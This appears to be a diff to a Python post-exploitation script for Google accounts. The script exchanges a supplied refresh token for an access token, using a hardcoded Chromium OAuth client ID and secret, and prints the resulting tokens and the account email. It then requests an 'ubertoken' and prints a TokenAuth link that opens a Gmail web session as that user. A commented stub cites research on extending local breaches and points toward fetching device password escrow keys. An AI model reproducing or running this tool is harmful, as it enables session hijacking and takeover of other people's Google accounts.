@@ -13,47 +13,71 @@ import sys
 import requests
 
 def refreshToken(client_id, client_secret, refresh_token):
-        params = {
-                "grant_type": "refresh_token",
-                "client_id": client_id,
-                "client_secret": client_secret,
-                "refresh_token": refresh_token
-        }
+    params = {
+            "grant_type": "refresh_token",
+            "client_id": client_id,
+            "client_secret": client_secret,
+            "refresh_token": refresh_token
+    }
 
-        authorization_url = "https://oauth2.googleapis.com/token"
+    authorization_url = "https://oauth2.googleapis.com/token"
 
-        r = requests.post(authorization_url, data=params)
+    r = requests.post(authorization_url, data=params)
 
-        if r.ok:
-                return r.json()['access_token']
-        else:
-                return None
+    if r.ok:
+            return r.json()['access_token']
+    else:
+            return None
+
+def get_token_info(id_token):
+    endpoint = "https://oauth2.googleapis.com/tokeninfo?id_token={}"
+    r = requests.get(endpoint.format(id_token))
+    debugprint("[-] Raw response: {}".format(r.text))
+    if r.ok:
+        print("[+] Get valid access_token for {}\n".format(r.json()['email']))
+    else:
+        print("[x] Error")
+        debugprint(r.text)
 
 def refreshToken2(client_id, client_secret, refresh_token):
-        params = {
-                "grant_type": "refresh_token",
-                "client_id": client_id,
-                "client_secret": client_secret,
-                "refresh_token": refresh_token
-        }
+    params = {
+            "grant_type": "refresh_token",
+            "client_id": client_id,
+            "client_secret": client_secret,
+            "refresh_token": refresh_token
+    }
 
-        authorization_url = "https://www.googleapis.com/oauth2/v4/token"
+    authorization_url = "https://www.googleapis.com/oauth2/v4/token"
 
-        r = requests.post(authorization_url, data=params)
-        print(r.content)
-        if r.ok:
-                print(f"access_token:{r.json()['access_token']}")
-                print(f"scope:{r.json()['scope']}")
-                print(f"id_token:{r.json()['id_token']}")
-                return r.json()['access_token']
-        else:
-                return None
+    r = requests.post(authorization_url, data=params)
+    debugprint("[-] Raw response: {}".format(r.text))
+    if r.ok:
+            debugprint(f"[-] access_token: {r.json()['access_token']}")
+            debugprint(f"[-] scope: {r.json()['scope']}")
+            debugprint(f"[-] id_token: {r.json()['id_token']}")
+            get_token_info(r.json()['id_token'])
+            return r.json()['access_token']
+    else:
+            return None
 
 def get_decryption_key():
-        #https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/<resource_id >
-        #Todo
-        #https://www.bitdefender.com/blog/businessinsights/the-chain-reaction-new-methods-for-extending-local-breaches-in-google-workspace/
-        return 1
+    #https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/<resource_id >
+    #Todo
+    #https://www.bitdefender.com/blog/businessinsights/the-chain-reaction-new-methods-for-extending-local-breaches-in-google-workspace/
+    return 1
+
+def get_ubertoken(access_token):
+    # https://gist.github.com/arirubinstein/fd5453537436a8757266f908c3e41538#code
+    endpoint = "https://www.google.com/accounts/OAuthLogin?source=ChromiumBrowser&issueuberauth=1"
+    target = "https://accounts.google.com/TokenAuth?auth={}&service=mail&continue=http://mail.google.com/mail"
+    headers = {"Authorization": "Bearer {}".format(access_token)}
+    r = requests.get(endpoint, headers=headers)
+    if r.ok:
+        return target.format(r.text)
+    else:
+        debugprint("[x] Error when requesting ubertoken")
+        debugprint(r.text)
+        return None
 
 
 def main():
@@ -68,13 +92,22 @@ def main():
         sys.exit(1)
 
     options = parser.parse_args()
+
+    global debugprint
+    debugprint = print if options.debug else lambda *a, **k: None
+
     client_id = '77185425430.apps.googleusercontent.com'
     client_secret = 'OTJgUOQcT7lO7GsGZq2G4IlT'
     refresh_token = options.token
-    rt=refreshToken2(client_id, client_secret, refresh_token)
-    print(f'{rt}')
-    return rt
+    access_token = refreshToken2(client_id, client_secret, refresh_token)
+    if not access_token:
+        print("[x] Error, the refresh token seems not valid")
+        sys.exit(1)
+    print(f'[+] Access_token: {access_token}\n')
+    ubertoken = get_ubertoken(access_token)
+    print(f'[+] Click on this link to get a websession for this user: {ubertoken}\n')
+    return access_token
 
 
 if __name__ == "__main__":
-        main()
+    main()
